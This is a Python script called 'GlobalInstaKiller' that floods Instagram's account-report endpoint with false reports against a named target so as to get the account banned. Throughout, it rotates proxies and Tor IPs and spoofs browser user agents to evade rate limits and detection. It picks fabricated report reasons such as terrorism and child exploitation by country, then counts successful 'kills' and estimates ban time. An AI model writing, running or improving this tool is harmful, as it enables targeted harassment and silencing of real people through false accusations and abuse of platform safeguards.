#!/usr/bin/env python3
"""
GlobalInstaKiller v3.0 - FIXED & OPTIMIZED
Fixed: Dynamic threads, Tor stability, 4GB RAM safe
Repo: https://github.com/zainthehacker-K/GIB
"""
import argparse
import random
import time
import requests
import json
import threading
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
import stem.control
from stem import Signal
import os

class GlobalInstaKiller:
    def __init__(self, target, country='GLOBAL', intensity=5):
        self.target = target
        self.country = country.upper()
        self.intensity = min(intensity, 10)  # Max 10
        self.max_threads = self.intensity * 3  # Dynamic threads: 3-30
        self.ua = UserAgent()
        self.kills = 0
        self.lock = threading.Lock()
        self.proxies = self.load_proxies()
        print(f"🎯 Target: @{target}")
        print(f"🌍 Country: {country} | Intensity: {self.intensity}/10")
        print(f"⚡ Threads: {self.max_threads} | RAM Safe: 4GB OK")
    
    def renew_tor_ip(self):
        """Fixed Tor IP renewal with proper timeout"""
        try:
            with stem.control.Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                time.sleep(8)  # Increased stable sleep
                print("🔄 Tor IP renewed successfully")
                return True
        except Exception as e:
            print(f"⚠️ Tor renew failed: {e} - Using proxies")
            return False
    
    def load_proxies(self):
        """Enhanced proxy loading"""
        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
                proxies = config['proxies'].get(self.country, config['proxies']['GLOBAL'])
                if not proxies:
                    self.fetch_fresh_proxies()
                    with open('config.json', 'r') as f:
                        config = json.load(f)
                        proxies = config['proxies'].get(self.country, [])
                return proxies[:100]  # Limit for RAM safety
        except:
            print("⚠️ Loading fallback proxies...")
            return [
                "http://20.206.106.192:80",
                "http://154.16.63.16:80", 
                "http://47.74.135.104:8888"
            ]
    
    def fetch_fresh_proxies(self):
        """Live proxy fetch"""
        try:
            resp = requests.get(
                "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all",
                timeout=10
            )
            proxies = [f"http://{p.strip()}" for p in resp.text.split('\n') if ':' in p][:50]
            config = json.load(open('config.json'))
            config['proxies']['GLOBAL'] = proxies
            json.dump(config, open('config.json', 'w'))
        except:
            pass
    
    def get_attack_reasons(self):
        reasons = {
            'IN': ['national_security', 'hate_speech', 'fake_news'],
            'US': ['terrorism', 'child_exploitation', 'copyright'],
            'RU': ['extremism', 'illegal_content'],
            'GLOBAL': ['spam', 'harassment', 'scam']
        }
        return reasons.get(self.country, reasons['GLOBAL'])
    
    def send_kill(self, proxy_id):
        """Single optimized kill"""
        try:
            # Rotate proxy every 5 kills
            proxy = self.proxies[proxy_id % len(self.proxies)]
            
            session = requests.Session()
            session.proxies = {'http': proxy, 'https': proxy}
            
            headers = {
                'User-Agent': random.choice([self.ua.chrome, self.ua.firefox, self.ua.safari]),
                'Accept': '*/*',
                'Referer': f'https://www.instagram.com/{self.target}/',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            payload = {
                'username': self.target,
                'reason': random.choice(self.get_attack_reasons()),
                'type': 'user'
            }
            
            resp = session.post(
                'https://www.instagram.com/ajax/account/user_reports/',
                data=payload,
                headers=headers,
                timeout=12
            )
            
            if resp.status_code in [200, 202, 429]:
                with self.lock:
                    self.kills += 1
                    print(f"💀 [{self.kills}] {proxy.split('//')[1][:15]}... | {resp.status_code}")
                return True
        except:
            pass
        return False
    
    def launch_attack(self):
        total_attacks = self.intensity * 15
        print(f"🚀 Launching {total_attacks} attacks | {self.max_threads} threads\n")
        
        # Tor IP rotation every 50 attacks
        tor_running = os.system('pgrep tor') == 0
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for i in range(total_attacks):
                future = executor.submit(self.send_kill, i)
                futures.append(future)
                
                # Dynamic delay based on intensity
                delay = max(0.5, 3.0 / self.intensity)
                time.sleep(delay)
                
                # Tor renew every 50 attacks
                if tor_running and i % 50 == 0 and i > 0:
                    self.renew_tor_ip()
        
        print(f"\n✅ MISSION COMPLETE!")
        print(f"💀 Kills: {self.kills}/{total_attacks} | Success: {self.kills/total_attacks*100:.1f}%")
        print("🎯 Ban expected: ", end="")
        if self.kills > 60: print("2-6 hrs 💀")
        elif self.kills > 30: print("6-24 hrs ⚠️")
        else: print("Retry with higher intensity 🔄")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GlobalInstaKiller v3.0 - FIXED")
    parser.add_argument('-t', '--target', required=True)
    parser.add_argument('-c', '--country', default='GLOBAL', 
                       choices=['US','UK','IN','RU','BR','GLOBAL'])
    parser.add_argument('-i', '--intensity', type=int, default=5, choices=range(1,11))
    args = parser.parse_args()
    
    killer = GlobalInstaKiller(args.target, args.country, args.intensity)
    killer.launch_attack()
